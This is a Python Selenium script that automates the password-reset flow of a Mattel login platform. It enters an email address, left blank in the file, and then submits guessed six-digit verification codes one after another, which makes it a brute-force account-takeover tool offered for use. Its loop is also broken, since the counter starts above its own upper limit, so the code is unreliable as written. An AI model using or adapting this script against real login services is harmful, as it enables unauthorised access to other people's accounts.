import selenium
import time
from selenium import webdriver
from selenium.webdriver.common.keys import Keys
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC


# Pathway that contains webdriver
PATH = '/Users/tippylaptop/dev/webdriver_tool/chromedriver'
driver = webdriver.Chrome(PATH)

# Driver opens up web browser 
driver.get('https://login.platform.mattel/forgot?client_id=collectorshub&code_challenge=6yhg98M4aHc17q9u4NE7aJK8TGaNDiqusuVO3_vIXo8&code_challenge_method=S256&redirect_uri=https%3A%2F%2Fplatform.mattel%2Foauth%2Fcallback%2Fmcpp&response_type=code&state=eyJjbGllbnRfaWQiOiJjb2xsZWN0b3JzaHViIiwibm9uY2UiOiJSaWVMTk5LTjY5eHl6RkpOTkhlTiJ9')
time.sleep(2)

# Inserts email we want to reset password for
input_email = driver.find_element_by_id('email')
input_email.click()
# TODO: Erase email before pushing
input_email.send_keys("")
input_email.send_keys(Keys.ENTER)

# THIS SECTION IS FOR VERIFICATION CODE...currently manually inputting the first 5 digits until efficiency is increased
i=7383870
while i < 999999:
    time.sleep(2)
    input_verify = driver.find_element_by_id('verifyCode')
    input_verify.click()
    input_verify.clear()

    # Fills in the extra 0 if there is space
    code_str = str(i)
    verification_code = code_str.zfill(6)

    # Send the guessed verification code to the input box
    input_verify.send_keys(verification_code)
    input_verify.send_keys(Keys.ENTER)
    i = i+1

# Success == Quits browser
time.sleep(5)
driver.quit()